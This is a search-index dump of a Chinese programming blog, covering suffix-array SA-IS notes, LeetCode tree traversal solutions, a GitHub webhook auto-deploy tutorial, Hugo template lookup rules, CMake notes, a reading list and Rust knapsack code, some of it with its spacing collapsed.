字符串的空后缀，它不对应原始字符串的任何后缀。第二个条目对应的是原始字符串的空后缀，我们无法对它进行桶式排序，因为它是空的。不过我们已经知道它在开头，所以这不是问题。 让我们来看看这个算法，因为它适用于我们的老朋友cabbage。提醒一下，这里是 accounterLMSSort()的输入。 \u003e\u003e\u003e showSuffixArray(cabbage_summary_suffix_array) 03 02 00 01 \u003e\u003e\u003e showSuffixArray(cabbage_summary) 01 02 00 \u003e\u003e\u003e showSuffixArray(cabbage_summary_suffix_offsets) 01 04 07 现在，我们可以走一遍算法。 我们在摘要的后缀数组中找到的第一个条目（最后一个条目，因为我们是从后往前走）是 01。如果我们查看 summarySuffixOffsets 的偏移量 1，我们看到这对应于原始字符串第 4 位（age）的 LMS 后缀，所以我们可以在 a 桶的最后插入该后缀。 summary 的后缀数组的下一个条目是 00，summarySuffixOffsets 的偏移量 0 对应于原始字符串第 1 个位置的 LMS 后缀（abbage），所以我们把这个后缀插到 age 之前的 a 桶中。 倒数第二的条目被跳过，因为它指向原始字符串的空后缀，而我们无法将其进行桶排序。 最后一条被跳过，因为它代表摘要字符串末尾的空后缀，它在原始字符串中没有对应的 LMS 后缀。 最后，我们知道，空的后缀（在第 7 位）将出现在最后的后缀数组的开头。 当我们运行我们的函数时，我们可以看到同样的步骤发生。 \u003e\u003e\u003e cabbage_real = accurateLMSSort(b'cabbage', cabbage_buckets, ... cabbage_types, cabbage_summary_suffix_array, ... cabbage_summary_suffix_offsets) -1 -1 04 -1 -1 -1 -1 -1 -1 01 04 -1 -1 -1 -1 -1 07 01 04 -1 -1 -1 -1 -1 04 是在 a 桶的末尾，然后前面紧接着是 01，最后是空后缀在开头得到它的特殊位置。 ","date":"2020-08-15","objectID":"/2020/08/%E5%90%8E%E7%BC%80%E6%95%B0%E7%BB%84%E5%8F%8Asa-is%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/:4:6","tags":["SA-IS"],"title":"后缀数组及SA-IS算法笔记","uri":"/2020/08/%E5%90%8E%E7%BC%80%E6%95%B0%E7%BB%84%E5%8F%8Asa-is%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/"},{"categories":["算法"],"content":"整合在一起 在将 LMS 后缀放到正确的位置后，所有其他后缀都会像之前一样，通过第二轮诱导排序归位。我们现在已经描述了 makeSuffixArrayByInducedSorting()调用的所有函数，所以我们可以调用它来有效地建立一个我们喜欢的任何字符串的后缀数组……以及其内部计算的详细日志（为简洁起见这里省略）。 \u003e\u003e\u003e showSuffixArray(makeSuffixArrayByInducedSorting(b'cabbage', 256)) -1 -1 01 -1 -1 -1 -1 -1 ... 07 01 04 03 02 00 06 05 \u003e\u003e\u003e showSuffixArray(makeSuffixArrayByInducedSorting(baa, 256)) -1 -1 -1 -1 -1 01 -1 -1 -1 -1 ... 09 01 04 02 05 07 00 03 06 08 但是，由于大多数人想要建立一个排序后缀数组的人都会有一串字节，而不是任意大小的字母串，所以让我们做一个具有合理默认值的包装函数。 \u003e\u003e\u003e def makeSuffixArray(bytestring): ... return makeSuffixArrayByInducedSorting(bytestring, 256) 现在我们完成了。 \u003e\u003e\u003e naivelyMakeSuffixArray(b'cabbage') == makeSuffixArray(b'cabbage') True \u003e\u003e\u003e naivelyMakeSuffixArray(baa) == makeSuffixArray(baa) True ","date":"2020-08-15","objectID":"/2020/08/%E5%90%8E%E7%BC%80%E6%95%B0%E7%BB%84%E5%8F%8Asa-is%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/:4:7","tags":["SA-IS"],"title":"后缀数组及SA-IS算法笔记","uri":"/2020/08/%E5%90%8E%E7%BC%80%E6%95%B0%E7%BB%84%E5%8F%8Asa-is%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/"},{"categories":["剑指offer","leetcode"],"content":"从上到下按层打印二叉树，同一层的节点按从左到右的顺序打印，每一层打印到一行。 例如: 给定二叉树: [3,9,20,null,null,15,7], 3 / \\ 9 20 / \\ 15 7 返回其层次遍历结果： [ [3], [9,20], [15,7] ] ","date":"2020-08-14","objectID":"/2020/08/32_2/:1:0","tags":null,"title":"32_2","uri":"/2020/08/32_2/"},{"categories":["剑指offer","leetcode"],"content":"思路： 这次是要把每层分成一组，那么可以想每次循环把队列的每个值都拿出来，就是说每次最外面的大循环就是一层。 /** * Definition for a binary tree node. * public class TreeNode { * int val; * TreeNode left; * TreeNode right; * TreeNode(int x) { val = x; } * } */ class Solution { public List\u003cList\u003cInteger\u003e\u003e levelOrder(TreeNode root) { List\u003cList\u003cInteger\u003e\u003e ret = new ArrayList\u003c\u003e(); Queue\u003cTreeNode\u003e queue = new ArrayDeque\u003c\u003e(); if (root!=null) queue.add(root); while (!queue.isEmpty()) { List\u003cInteger\u003e list = new ArrayList\u003c\u003e(); for (int i =queue.size();i\u003e0;i--){ TreeNode node=queue.poll(); list.add(node.val); if (node.left != null) queue.add(node.left); if (node.right != null) queue.add(node.right); } ret.add(list); } return ret; } } ","date":"2020-08-14","objectID":"/2020/08/32_2/:2:0","tags":null,"title":"32_2","uri":"/2020/08/32_2/"},{"categories":null,"content":"github webhook 是什么 当 github 上面的仓库发生变化时（push 或 issue），可以自定义回调（一条链接）。 先定义一个脚本 例如： #/root/webhook/deploy.sh #!/bin/bash cd /path/to/directory git pull 注意要添加执行权限 chmod +x deploy.sh 在定义一个 webhook.js 文件 在同一目录下新建 webhook.js 文件 var http = require('http') var spawn = require('child_process').spawn var createHandler = require('github-webhook-handler') // 注意将 secret 修改你自己的 var handler = createHandler({ path: '/webhook', secret: 'yourwebhooksecret' }) http.createServer(function (req, res) { handler(req, res, function (err) { res.statusCode = 404 res.end('no such location') }) }).listen(6666) handler.on('error', function (err) { console.error('Error:', err.message) }) handler.on('push', function (event) { console.log( 'Received a push event for %s to %s', event.payload.repository.name, event.payload.ref ) runCommand('sh', ['./deploy.sh'], function (txt) { console.log(txt) }) }) function runCommand(cmd, args, callback) { var child = spawn(cmd, args) var resp = 'Deploy OK' child.stdout.on('data', function (buffer) { resp += buffer.toString() }) child.stdout.on('end', function () { callback(resp) }) } 用 pm2 启动服务 pm2 start webhook.js Nginx 配置 # GitHub auto deploy webhook location /webhook { proxy_pass http://127.0.0.1:6666; } GitHub Webhook 配置 在 github 仓库的Setting-webhooks新建一个 webhook,Content Type 为 application/json，secret 设置成与 webhook.js 中的相同。 图\" 图 验证 如果如图表示成功 图\" 图 ","date":"2020-08-14","objectID":"/2020/08/webhook%E6%95%99%E7%A8%8B/:0:0","tags":null,"title":"Webhook教程","uri":"/2020/08/webhook%E6%95%99%E7%A8%8B/"},{"categories":["剑指offer","leetcode"],"content":"从上到下打印二叉树 从上到下打印出二叉树的每个节点，同一层的节点按照从左到右的顺序打印。 例如: 给定二叉树: [3,9,20,null,null,15,7], 3 / \\ 9 20 / \\ 15 7 返回： [3,9,20,15,7] 来源：力扣（LeetCode） 链接：https://leetcode-cn.com/problems/cong-shang-dao-xia-da-yin-er-cha-shu-lcof 著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题目要求从上到下，从左到右打印，自然就想到用队列来循环。也就是 bfs 算法。 class TreeNode { int val; TreeNode left; TreeNode right; TreeNode(int x) { val = x; } } public int[] levelOrder(TreeNode root) { if (root == null) return new int[0]; Queue\u003cTreeNode\u003e queue = new ArrayDeque\u003c\u003e() {{ add(root); }}; List\u003cInteger\u003e list = new ArrayList\u003c\u003e(); while (!queue.isEmpty()) { TreeNode node = queue.poll(); list.add(node.val); if (node.left != null) queue.add(node.left); if (node.right != null) queue.add(node.right); } int[] ret = new int[list.size()]; for (int i = 0; i \u003c list.size(); i++) { ret[i] = list.get(i); } return ret; } // Definition for a binary tree node. #[derive(Debug, PartialEq, Eq)]pubstruct TreeNode{pubval: i32,publeft: Option\u003cRc\u003cRefCell\u003cTreeNode\u003e\u003e\u003e,pubright: Option\u003cRc\u003cRefCell\u003cTreeNode\u003e\u003e\u003e,}implTreeNode{#[inline]pubfn new(val: i32)-\u003e Self{TreeNode{val,left: None,right: None,}}}usestd::rc::Rc;usestd::cell::RefCell;usestd::collections::VecDeque;pubfn level_order(root: Option\u003cRc\u003cRefCell\u003cTreeNode\u003e\u003e\u003e)-\u003e Vec\u003ci32\u003e{ifroot.is_none(){returnvec![];}letroot=root.unwrap();letmutqueue=VecDeque::new();queue.push_back(root.clone());letmutret=vec![];while!queue.is_empty(){letnode=queue.pop_front().unwrap();ret.push(node.borrow().val);ifnode.borrow().left.is_some(){letleft=Rc::clone(node.borrow().left.as_ref().unwrap());queue.push_back(left);}ifnode.borrow().right.is_some(){letleft=Rc::clone(node.borrow().right.as_ref().unwrap());queue.push_back(left);}}ret} ","date":"2020-08-13","objectID":"/2020/08/32-1/:0:0","tags":null,"title":"32-1","uri":"/2020/08/32-1/"},{"categories":null,"content":"常用命令 ","date":"2020-08-13","objectID":"/2020/08/hugo%E6%95%99%E7%A8%8B/:0:0","tags":null,"title":"Hugo教程","uri":"/2020/08/hugo%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"hugo new 添加网站内容. 例如: hugo new about.md, 他会在 content 目录下生成一个 about.md 的文件, 根据这个文件可以生成对应的静态页面. 可以在 about.md 前面添加对应的路径, 但文件会以 content 为根目录, 也就是说所有添加新文件都会存放在 content 目录下面. ","date":"2020-08-13","objectID":"/2020/08/hugo%E6%95%99%E7%A8%8B/:1:0","tags":null,"title":"Hugo教程","uri":"/2020/08/hugo%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"hugo new theme 为网站添加 UI, 也就是模板文件/主题文件. 例如: hugo new theme mytheme. 这会在 themes 目录下创建一个 mytheme 目录, mytheme 目录中会默认添加一些基本的文件结构. 所有的模板/主题文件都会保存在 themes 目录中. ","date":"2020-08-13","objectID":"/2020/08/hugo%E6%95%99%E7%A8%8B/:2:0","tags":null,"title":"Hugo教程","uri":"/2020/08/hugo%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"hugo 生成静态网站, 默认在生成的静态文件保存在 public 目录中. 也可以指定路. ","date":"2020-08-13","objectID":"/2020/08/hugo%E6%95%99%E7%A8%8B/:3:0","tags":null,"title":"Hugo教程","uri":"/2020/08/hugo%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"hugo server hugo 自带一个 web 服务器, 运行 hugo server 后可以通过 http://localhost:1313 来访问静态网站. 下面是 hugo server 常用的参数, 注意大小写: -p 端口: 修改默认端口 -D: 在使用 server 预览网站时, draft 属性为 ture 的草稿文件是不会生成预览的. 添加-D 后可以预览草稿文件. 文章和页面的对应关系 └── content ├── _index.md // [home] \u003c- https://example.com/ ** ├── about.md // [page] \u003c- https://example.com/about/ ├── posts | ├── _index.md // [section] \u003c- https://example.com/posts/ ** | ├── firstpost.md // [page] \u003c- https://example.com/posts/firstpost/ | ├── happy | | ├── _index.md // [section] \u003c- https://example.com/posts/happy/ ** | | └── ness.md // [page] \u003c- https://example.com/posts/happy/ness/ | └── secondpost.md // [page] \u003c- https://example.com/posts/secondpost/ └── quote ├── _index.md // [section] \u003c- https://example.com/quote/ ** ├── first.md // [page] \u003c- https://example.com/quote/first/ └── second.md // [page] \u003c- https://example.com/quote/second/ // hugo默认生成的页面, 没有对应的markdown文章 分类列表页面 // [taxonomyTerm] \u003c- https://example.com/categories/ ** 某个分类下的所有文章的列表 // [taxonomy] \u003c- https://example.com/categories/one-category ** 标签列表页面 // [taxonomyTerm] \u003c- https://example.com/tags/ ** 某个标签下的所有文章的列表 // [taxonomy] \u003c- https://example.com/tags/one-tag ** 中括号[]中标注的是页面的 kind 属性, 他们整体上分为两类: single(单页面 - page) 和 list(列表页 - home, section, taxonomyTerm, taxonomy). content 目录下的所有 _index.md 可以用来生成对应的列表页面, 如果没有这些 markdown 文件, hugo 也会默认生成对应的页面. 有这些 markdown 文件的话, hugo 会根据文件里面的 FrontMatter 的设置生成更个性的页面. 页面和模板的对应关系 页面和模板的应对关系是根据页面的一系列的属性决定的, 这些属性有: Kind, Output Format, Language, Layout, Type, Section. 他们不是同时起作用, 其中 kind, layout, type, section 用的比较多. kind: 用于确定页面的类型, 单页面使用 single.html 为默认模板页, 列表页使用 list.html 为默认模板页, 值不能被修改 section: 用于确定 section tree 下面的文章的模板. section tree 的结构是由 content 目录结构生成的, 不能被修改, content 目录下的一级目录自动成为 root section, 二级及以下的目录, 需要在目录下添加 _index.md 文件才能成为 section tree 的一部分. 如果页面不在 section tree 下 section 的值为空 type: 可以在 Front Matter 中设置, 用户指定模板的类型. 如果没设定 type 的值, type 的值等于 section 的值 或 等于 page(section 为空的时候) layout: 可以在 Front Matter 中设置, 用户指定具体的模板名称. 从层次上 hugo 中的模板分为三个级别的, hugo 依据从上到下的顺序一次查找模板,直到找到为止. 特定页面的模板 应对某一类页面的模板 应对全站的模板: 存放在_default 目录下面的 list.html 和 single.html 页面 HomepageTemplate 查找顺序 ","date":"2020-08-13","objectID":"/2020/08/hugo%E6%95%99%E7%A8%8B/:4:0","tags":null,"title":"Hugo教程","uri":"/2020/08/hugo%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"首页模板的查找顺序 layouts/page/index.html //page为type的默认值 layouts/page/home.html layouts/page/list.html layouts/index.html layouts/home.html layouts/list.html layouts/_default/index.html layouts/_default/home.html layouts/_default/list.html ","date":"2020-08-13","objectID":"/2020/08/hugo%E6%95%99%E7%A8%8B/:5:0","tags":null,"title":"Hugo教程","uri":"/2020/08/hugo%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"设置了 type 属性的首页模板的查找顺序 layouts/type的值/index.html layouts/type的值/home.html layouts/type的值/list.html layouts/index.html layouts/home.html layouts/list.html layouts/_default/index.html layouts/_default/home.html layouts/_default/list.html 如果要设置首页的 type 属性, 需要在 content 目录下面添加_index.md 文件, 并设置 FromtMatter 中的 type 属性, 同时在 layouts 目录下面创建和 type 属性的值相同的目录名. SingePageTemplate 查找顺序 ","date":"2020-08-13","objectID":"/2020/08/hugo%E6%95%99%E7%A8%8B/:6:0","tags":null,"title":"Hugo教程","uri":"/2020/08/hugo%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"section 下单页面模板的查找顺序 layouts/section的值/layout的值.html layouts/section的值/single.html layouts/_default/single.html ","date":"2020-08-13","objectID":"/2020/08/hugo%E6%95%99%E7%A8%8B/:7:0","tags":null,"title":"Hugo教程","uri":"/2020/08/hugo%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"非 section 下单页面模板的查找顺序 layouts/page/layout的值.html layouts/page/single.html //type的默认值 layouts/_default/single.html ","date":"2020-08-13","objectID":"/2020/08/hugo%E6%95%99%E7%A8%8B/:8:0","tags":null,"title":"Hugo教程","uri":"/2020/08/hugo%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"设置了 type 属性的单页面模板的查找顺序 layouts/type的值/layout的值.html layouts/type的值/single.html layouts/_default/single.html SectionTemplate 的查找顺序 section template 为列表类型的模板, 用来展示 section tree 中某个的节点文章列表, Kind 可以轻松地与模板中的 where 函数结合使用，以创建种类特定的内容列表. ","date":"2020-08-13","objectID":"/2020/08/hugo%E6%95%99%E7%A8%8B/:9:0","tags":null,"title":"Hugo教程","uri":"/2020/08/hugo%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"section 模板的查找顺序 layouts/section的值/section的值.html layouts/section的值/section.html layouts/section的值/list.html layouts/section/section的值.html layouts/section/section.html layouts/section/list.html layouts/_default/section的值.html layouts/_default/section.html layouts/_default/list.html ","date":"2020-08-13","objectID":"/2020/08/hugo%E6%95%99%E7%A8%8B/:10:0","tags":null,"title":"Hugo教程","uri":"/2020/08/hugo%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"设置 type 的 section 模板的查找顺序 layouts/type的值/section的值.html layouts/type的值/section.html layouts/type的值/list.html layouts/section的值/section的值.html layouts/section的值/section.html layouts/section的值/list.html layouts/section/section的值.html layouts/section/section.html layouts/section/list.html layouts/_default/section的值.html layouts/_default/section.html layouts/_default/list.html TaxonomyTemplate 的查找顺序 tags 和 categories 是 hugo 默认会创建的两种分类, 如果要手工创建分类可以在 config 文件中配置 [taxonomies] category = \"categories\" tag = \"tags\" 如果不希望 hugo 创建任何分类, 配置 config 中的 disableKinds 属性 disableKinds = [\"taxonomy\", \"taxonomyTerm\"] taxonomy list(某一分类的文章列表)), taxonomy terms list(所有的分类) ","date":"2020-08-13","objectID":"/2020/08/hugo%E6%95%99%E7%A8%8B/:11:0","tags":null,"title":"Hugo教程","uri":"/2020/08/hugo%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"Taxonomy Terms List Pages layouts/categories/category.terms.html layouts/categories/terms.html layouts/categories/list.html layouts/taxonomy/category.terms.html layouts/taxonomy/terms.html layouts/taxonomy/list.html layouts/category/category.terms.html layouts/category/terms.html layouts/category/list.html layouts/_default/category.terms.html layouts/_default/terms.html layouts/_default/list.html ","date":"2020-08-13","objectID":"/2020/08/hugo%E6%95%99%E7%A8%8B/:12:0","tags":null,"title":"Hugo教程","uri":"/2020/08/hugo%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"Taxonomy List Pages layouts/categories/category.html layouts/categories/taxonomy.html layouts/categories/list.html layouts/taxonomy/category.html layouts/taxonomy/taxonomy.html layouts/taxonomy/list.html layouts/category/category.html layouts/category/taxonomy.html layouts/category/list.html layouts/_default/category.html layouts/_default/taxonomy.html layouts/_default/list.html 基础模板–Baseof.html 基础模板页的文件名字为 baseof.html 或 \u003cTYPE\u003e-baseof.html 在基础模板页中使用 block 定义了一个占位符, 当模板页使用了一个基础模板页时, 模板页的解析后的内容会嵌入到基础模板页面中 block 的位置 示例: baseof.html 的内容如下 \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\" /\u003e \u003ctitle\u003ebaseof基础模板页\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cdiv id=\"content\"\u003e {{- block \"main\" . }}{{- end }} \u003c!-- . 点表示从基础模板页面传递到模板页面的变量 --\u003e \u003c/div\u003e \u003c/body\u003e \u003c/html\u003e 网站首页引用基础模板页 \u003c!-- block定义的占位符是 'main', 所以这里需要定义名为 'main'的模板 --\u003e {{- define \"main\" -}} \u003csection id=\"posts\" class=\"posts\"\u003e 被define 和 end 包裹的内容会插入到baseof.html文件的{{- block \"main\" . }}{{- end }}位置. \u003c/section\u003e {{- end -}} 除了要在基础模板页使用 block 外, 基础模板页的 命名 和 存放位置 也要征询一定的规制 ","date":"2020-08-13","objectID":"/2020/08/hugo%E6%95%99%E7%A8%8B/:13:0","tags":null,"title":"Hugo教程","uri":"/2020/08/hugo%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"基础模板页的存放位置及命名 /layouts/section/\u003cTYPE\u003e-baseof.html /themes/\u003cTHEME\u003e/layouts/section/\u003cTYPE\u003e-baseof.html /layouts/\u003cTYPE\u003e/baseof.html /themes/\u003cTHEME\u003e/layouts/\u003cTYPE\u003e/baseof.html /layouts/section/baseof.html /themes/\u003cTHEME\u003e/layouts/section/baseof.html /layouts/_default/\u003cTYPE\u003e-baseof.html /themes/\u003cTHEME\u003e/layouts/_default/\u003cTYPE\u003e-baseof.html /layouts/_default/baseof.html /themes/\u003cTHEME\u003e/layouts/_default/baseof.html 自定义数据 Hugo 中的数据库 ","date":"2020-08-13","objectID":"/2020/08/hugo%E6%95%99%E7%A8%8B/:13:1","tags":null,"title":"Hugo教程","uri":"/2020/08/hugo%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"data 目录 在 data 目录下创建 json | yaml | toml 格式的文件. 通过 .Site.Data 变量以 MPA 的方式访问这些数据. 也就是 MAP 的结构组织目录和文件名的. 具体的可以输出 .Site.Data 来查看 例如在 data 目录中存放了两个用户的信息: data/users/jim.toml data/users/tom.toml 文件的内容为: name = \"Jim\" age = 22 address = [ \"地址一\", \"地址二\" ] 在模板中使用这些数据: {{$users := .Site.Data.users}} {{$user_jim := .Site.Data.users.jim}} \u003cdiv\u003ejim.tom文件中的姓名: {{$user_jim.name}}\u003c/div\u003e \u003cdiv\u003e输出users目录下所有文件的内容: {{$users}}\u003c/div\u003e ","date":"2020-08-13","objectID":"/2020/08/hugo%E6%95%99%E7%A8%8B/:14:0","tags":null,"title":"Hugo教程","uri":"/2020/08/hugo%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"外源数据 hugo 还可以通过 getJSON 和 getCSV 两个函数加载外部数据, 这两个函数是模板函数. 在外部数据加载完成以前, hugo 会暂停渲染模板文件. 语法: {{ $dataJ := getJSON \"url\" }} {{ $dataC := getCSV \"separator\" \"url\" }} 带可变参数语法: {{ $dataJ := getJSON \"url prefix\" \"arg1\" \"arg2\" \"arg n\" }} {{ $dataC := getCSV \"separator\" \"url prefix\" \"arg1\" \"arg2\" \"arg n\" }} getCSV 的第一个参数为分隔符. 示例: \u003ctable\u003e \u003cthead\u003e \u003ctr\u003e \u003cth\u003eName\u003c/th\u003e \u003cth\u003ePosition\u003c/th\u003e \u003cth\u003eSalary\u003c/th\u003e \u003c/tr\u003e \u003c/thead\u003e \u003ctbody\u003e {{ $url := \"https://example.com/demo.csv\" }} {{ $sep := \",\" }} {{ range $i, $r := getCSV $sep $url }} \u003ctr\u003e \u003ctd\u003e{{ index $r 0 }}\u003c/td\u003e \u003ctd\u003e{{ index $r 1 }}\u003c/td\u003e \u003ctd\u003e{{ index $r 2 }}\u003c/td\u003e \u003c/tr\u003e {{ end }} \u003c/tbody\u003e \u003c/table\u003e ","date":"2020-08-13","objectID":"/2020/08/hugo%E6%95%99%E7%A8%8B/:15:0","tags":null,"title":"Hugo教程","uri":"/2020/08/hugo%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"文件结构 helloworld |--CMakeLists.txt |--helloworld.cpp ","date":"2020-08-11","objectID":"/2020/08/cmake%E7%AC%94%E8%AE%B0/:0:1","tags":["cmake"],"title":"Cmake笔记","uri":"/2020/08/cmake%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"CMakeLists.txt # CMake 最低版本号要求 cmake_minimum_required(VERSION 3.0) # 指定项目名称，其实就是给变量PROJECT_NAME赋值 project(HelloWorld) # 查找指定目录下的所有源文件 并存放到指定变量名SRC中 aux_source_directory(. SRC) # 指定生成目标 add_executable(${PROJECT_NAME} ${SRC}) ***aux_source_directory**这个函数在添加源码文件时，是不会把头文件添加进去的* # CMake 最低版本号要求 cmake_minimum_required(VERSION 3.0) # 项目名称 project(CMakeFile) # 查找指定目录下的所有.cpp与.h文件 并存放到指定变量名SC_FILES中 FILE(GLOB SC_FILES \"*.cpp\" \"*.h\") # 指定生成目标 add_executable(${PROJECT_NAME} ${SC_FILES}) 从第三方获取一些功能的源码文件，如 md5 CMakeFile |--common | |--md5 | |--md5.cpp | |--md5.h |--CMakeLists.txt |--main.cpp |--stdafx.h # CMake 最低版本号要求 cmake_minimum_required(VERSION 3.0) # 项目名称 project(CMakeFile) # 设置md5代码文件的路径 set(MD5_FILE \"./common/md5/md5.cpp\" \"./common/md5/md5.h\") # 查找指定目录下的所有.cpp与.h文件 并存放到指定变量名SC_FILES中 FILE(GLOB SC_FILES \"*.cpp\" \"*.h\") # 对md5的源码分组到md5组里 source_group(md5 FILES ${MD5_FILE}) # 指定生成目标 add_executable(${PROJECT_NAME} ${SC_FILES} ${MD5_FILE}) 一. 初识 cmake - cmake 实践 1.0.0 documentation ","date":"2020-08-11","objectID":"/2020/08/cmake%E7%AC%94%E8%AE%B0/:0:2","tags":["cmake"],"title":"Cmake笔记","uri":"/2020/08/cmake%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":" 博观而约取，厚积而薄发。 ——苏轼 记录一下自己读过的书： 2020 加密与解密 矩阵论（顾桂定 张振宇） 矩阵分析简明教程 Spring Security 实战 SpringBoot 2 实战之旅 Spring Data Jpa 从入门到精通 挑战程序设计竞赛 2 算法和数据结构 windows 程序设计 树莓派用户指南 从实践中学习 Metaspolit 5 渗透测试 Elastic Stack 应用宝典 C++反汇编与逆向分析技术揭秘 数据密集型应用系统设计 深入浅出 MySql 写给大家看的 UI 设计书 MyBatis 3 源码深度解析 精通 Spring（Java Web 开发与 Spring Boot 高级功能） 架构修炼之道 MyBatis 从入门到精通 阿里巴巴 Java 开发手册 深入理解计算机系统（原书第 3 版） 算法（第四版） 码出高效：Java 开发手册 Spring Cloud Alibaba 微服务原理与实战 深入理解 Spring Cloud 与微服务构建 Spring Boot+Vue 全栈开发实战 C++ primer 第五版 深入浅出通信原理 通信原理 算法图解 算法之美 SpringBoot 揭秘：快速构建微服务体系 Python 编程：从入门到实践 2019 Rust 编程之道 Rust 权威指南 图解 HTTP 白帽子讲 Web 安全 白话大数据与机器学习 编码：隐匿在计算机软硬件背后的语言 Java 编程思想 JavaScript 高级程序设计 JavaScript 忍者秘籍 高性能 JavaScript CSS 世界 新时期的 Node.js 入门 Spring Boot 编程思想 汇编语言 第三版 王爽 手把手教你学 51 单片机-C 语言版 C++ Primer Plus 第六版 Java 8 实战 Docker — 从入门到实践 Web 安全攻防：渗透测试实战指南 浮生六记 2018 第一行代码 Android 第二版 Java 编程思想 数据结构教程 JavaScript 函数式编程 The Linux Command Line 鸟哥的 Linux 私房菜 Vue.js 实战 JavaScript DOM 编程艺术 永恒的终结 人间失格 解忧杂货店 秘密 嫌疑人 X 的献身 彷徨之刃 恶意 白夜行 幻夜 1984 动物庄园 ","date":"2020-08-11","objectID":"/books/:0:0","tags":null,"title":"书单","uri":"/books/"},{"categories":null,"content":"天蝎男，爱羽毛球。 技能点： 前端：Vue+React 后端：Java，Spring Boot，Rust，Nodejs Qt 单片机 Win32 编程 x86 汇编 逆向 ","date":"2020-08-11","objectID":"/about/:0:0","tags":null,"title":"关于我","uri":"/about/"},{"categories":["算法"],"content":"0-1 背包 有 N 件物品和一个容量为 V 的背包。放入第 i 件物品耗费的费用是 cost[i]， 价值是 value[i]。求解将哪些物品装入背包可使价值总和最大 //初始化 letv=2;//背包体积 letn=4;//物品个数,必须等于cost和value的长度 letcost=vec![1,2,3,4];//物品花费 letvalue=vec![1,3,5,7];//物品价值 letmutf=vec![0;v+1];// 0 \u003c= i \u003c n foriin0..n{zoro_one_pack(\u0026mutf,cost[i],value[i],v);}//最后价值总和最大的值就是f[v] fn zoro_one_pack(f: \u0026mutVec\u003cusize\u003e,cost: usize,value: usize,v: usize){forjin(cost..=v).rev(){f[j]=std::cmp::max(f[j],f[j-cost]+value);}} 注意： 如果题目要求 恰好装满背包 ,则除了f[0]设为 0，其余都设为 $-∞$，如果不要求恰好装满，则f全初始化为 0。 ","date":"2020-08-10","objectID":"/2020/08/%E8%83%8C%E5%8C%85%E9%97%AE%E9%A2%98/:0:0","tags":["算法","背包问题"],"title":"背包问题","uri":"/2020/08/%E8%83%8C%E5%8C%85%E9%97%AE%E9%A2%98/"},{"categories":["算法"],"content":"一个常数优化 //伪代码 foriin0..n{forjin(cpm::max(cost[i],v-(cost[i]+..+cost[n-1]))..=v).rev(){f[j]=std::cmp::max(f[j],f[j-cost[i]]+value[i]);}} 完全背包 有 N 种物品和一个容量为V 的背包，每种物品都有无限件可用。放入第 i 种物品的费用是 cost[i]，价值是 value[i]。求解：将哪些物品装入背包，可使这些物品的耗费的费用总 和不超过背包容量，且价值总和最大 思路是转化成0-1 背包：将一种物品拆成多件只能选 0 件或 1 件的 01 背包中的物品。 //初始化 letv=2;//背包体积 letn=4;//物品个数,必须等于cost和value的长度 letcost=vec![1,2,3,4];//物品花费 letvalue=vec![1,3,5,7];//物品价值 letmutf=vec![0;v+1];// 0 \u003c= i \u003c n foriin0..n{complete_pack(\u0026mutf,cost[i],value[i],v);}//最后价值总和最大的值就是f[v] fn complete_pack(f: \u0026mutVec\u003cusize\u003e,cost: usize,value: usize,v: usize){//就是将0-1背包中内层循环次序反转 forjincost..=v{f[j]=std::cmp::max(f[j],f[j-cost]+value);}} 多重背包 有 N 种物品和一个容量为 V 的背包。第 i 种物品最多有 M[i] 件可用，每件耗费的空间是 cost[i]，价值是 value[i]。求解将哪些物品装入背包可使这些物品的耗费的空间总和不超 过背包容量，且价值总和最大 fn multiple_pack(f: \u0026mutVec\u003cusize\u003e,cost: usize,value: usize,v: usize,mutm: usize){ifcost*m\u003e=v{complete_pack(f,cost,value,v);return;}letmutk=1;whilek\u003cm{zoro_one_pack(f,k*cost,k*value,v);m-=k;k*=2;}zoro_one_pack(f,m*cost,m*value,v)} ","date":"2020-08-10","objectID":"/2020/08/%E8%83%8C%E5%8C%85%E9%97%AE%E9%A2%98/:0:1","tags":["算法","背包问题"],"title":"背包问题","uri":"/2020/08/%E8%83%8C%E5%8C%85%E9%97%AE%E9%A2%98/"},{"categories":["算法"],"content":"可行性问题 当问题是“每种有若干件的物品能否填满给定容量的背包”，只须考虑填满背包的可行性，不需考虑每件物品的价值时，多重背包问题同样有 O(VN) 复杂度的算法 fn multiple_pack_ok(){//也可以用硬币模型来理解。v代表硬币的总价值，n代表硬币的种类， //m是每个硬币的数量，cost代表每种硬币的价值 letv=2;letn=4;letcost=vec![5,4,9,3];letm=vec![2,1,4,6];letmutf=vec![-1;v+1];f[0]=0;foriin0..n{forjin0..=v{iff[j]\u003e=0{f[j]=m[i];}//else { // f[j] = -1; 应为默认初始化就是-1 //} }ifv\u003ccost[i]{break;}forjin0..=(v-cost[i]){iff[j]\u003e=0{f[j+cost[i]]=std::cmp::max(f[j+cost[i]],f[j]-1);}}}} f[i][j]表示使用前i个物品，填充容量为j的背包，第i个物品最多能够剩余多少个，如果无法填充容量为j的背包，则值为-1 首先，f[i - 1][j] 代表前 i - 1 件物品凑面值 j，如果其值大于等于 0 即状态合法可以凑出j，就说明接下来不需要第i种硬币就能凑出j，所以剩余的硬币数就是m[i]了。 如果f[i - 